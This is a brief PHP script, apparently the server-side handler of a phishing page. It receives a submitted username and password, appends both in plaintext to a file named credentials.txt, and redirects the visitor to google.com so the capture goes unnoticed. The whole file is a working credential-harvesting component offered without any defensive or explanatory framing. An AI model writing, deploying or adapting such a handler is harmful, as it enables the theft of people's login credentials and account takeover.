<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = htmlspecialchars($_POST['username']);
        $password = htmlspecialchars($_POST['password']);

        $file = fopen("credentials.txt", "a");
        fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");
        fclose($file);

        header("Location: https://www.google.com");
        exit();
    } else {
        echo "Invalid Request!";
    }
} else {
    echo "Access Denied!";
}
?>
